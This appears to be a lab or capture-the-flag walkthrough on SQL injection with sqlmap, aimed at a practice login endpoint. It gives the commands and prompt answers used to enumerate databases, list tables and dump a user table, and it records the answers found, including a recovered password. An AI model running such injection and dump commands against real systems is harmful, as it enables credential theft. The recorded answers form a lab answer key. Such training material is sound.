
`http://10.10.92.3/ai/login`

`http://10.10.92.3/ai/includes/user_login?email=test&password=test`

Run the commands as discussed in the previous task on this URL and answer the questions given in this task. Also, remember to include your URL inside single quotes `'`. This is to avoid errors with special characters in the terminal such as `?`.

**Important Note:** You may not get the results by the simple scan; add `--level=5` at the end of your commands to perform the in-depth scans. Secondly, while running the commands, the tool may ask you some questions; make sure to respond to them as follows to run the scan smoothly:

- It looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]: `y`
- For the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n]: `y`
- Injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]: `y`
- GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N]: `n`

---------
*How many databases are available in this web application?*
- `sqlmap -u <url> --dbs --level=5`
	- Dumped database information -> **6 databases**

*What is the name of the table available in the ai database*
- `sqlmap -u 'http://10.10.215.193/ai/includes/user_login?email=test&password=test' -D ai -tables
	- Dumped table information -> "ai database holds `user` tables"


*What is the password of the email test@chatai.com?`*
- `sqlmap -u 'http://10.10.215.193/ai/includes/user_login?email=test&password=test' -D ai -T user --dump
	- **Password:** 12345678
`




`